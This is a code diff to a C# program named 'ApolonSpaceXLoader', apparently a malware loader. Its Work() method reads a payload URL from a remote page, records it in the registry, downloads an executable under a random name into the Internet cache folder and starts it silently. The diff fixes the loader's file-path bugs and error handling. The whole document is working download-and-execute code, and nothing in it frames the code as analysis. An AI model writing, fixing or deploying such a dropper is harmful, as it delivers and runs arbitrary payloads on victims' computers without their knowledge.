@@ -43,41 +43,45 @@ namespace ApolonSpaceXLoader
 
         private static void Work()
         {
-            string rnd = Helper.RandomID(6);
-            string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";
-
-            string urlOnPage;
-            using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
-            {                
-                urlOnPage = strr.ReadToEnd();
-            }
-
-            using (WebClient wc = new WebClient())
+            try
             {
-                ewh.WaitOne();                
-                if (MyRegistry.GetURL() != null)
+                string rnd = Helper.RandomID(6);
+                string dropPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.InternetCache)}\\{rnd}.exe";
+
+                string urlOnPage;
+                using (StreamReader strr = new StreamReader(HttpWebRequest.Create(urlPage).GetResponse().GetResponseStream()))
                 {
-                    if (MyRegistry.GetURL() != urlOnPage)
+                    urlOnPage = strr.ReadToEnd();
+                }
+
+                using (WebClient wc = new WebClient())
+                {
                     {
-                        if (File.Exists($"{dropPath}\\{rnd}.exe"))
+                        if (MyRegistry.GetURL() != urlOnPage)
                         {
-                            File.Delete($"{dropPath}\\{rnd}.exe");
-                        }
-                        MyRegistry.SetURL(urlOnPage);
-                        if (urlOnPage.Length > 0)
-                        {
-                            try
+                            if (File.Exists(dropPath))
                             {
-                                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
-                                wc.DownloadFile(new Uri(urlOnPage), $"{dropPath}\\{rnd}.exe");
-                                Process.Start($"{dropPath}\\{rnd}.exe");
+                                File.Delete(dropPath);
                             }
-                            catch { }
+                            MyRegistry.SetURL(urlOnPage);
+                            if (urlOnPage.Length > 0)
+                            {
+                                if (MyRegistry.GetURL() != null)
+                                {
+                                    wc.DownloadFile(new Uri(urlOnPage), dropPath);
+                                    Process.Start(dropPath);
+                                }
+                            }
                         }
                     }
-                }                
-                wc.Dispose();
-                clearCount.Set();                
+                    ewh.Set();
+                    clearCount.Set();
+                }
+            }
+            catch
+            {
+                ewh.Set();
+                clearCount.Set();
             }
         }
     }
